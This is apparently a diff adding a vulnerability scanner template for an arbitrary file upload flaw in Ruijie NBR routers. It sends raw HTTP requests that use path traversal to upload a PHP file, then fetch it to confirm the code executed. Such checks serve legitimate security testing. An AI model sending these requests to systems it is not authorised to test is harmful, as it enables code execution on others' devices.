@@ -1,0 +1,40 @@
+id: poc-yaml-ruijie-nbr-ddi-fileupload
+info:
+  name: Ruijie NBR Router Arbitrary File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: fileupload
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+flow: |
+  http(1) && http(2)
+http:
+  - raw:
+      - |
+        POST /ddi/server/fileupload.php?uploadDir=../../test&name={{t1}}.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: image/jpeg
+
+        <?php echo md5({{t1}});?>
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: dsl
+        dsl:
+          - contains(json(body).result, ".php")
+  - raw:
+      - |
+        GET /test/{{t1}}.php HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{t2}}"
+        part: body
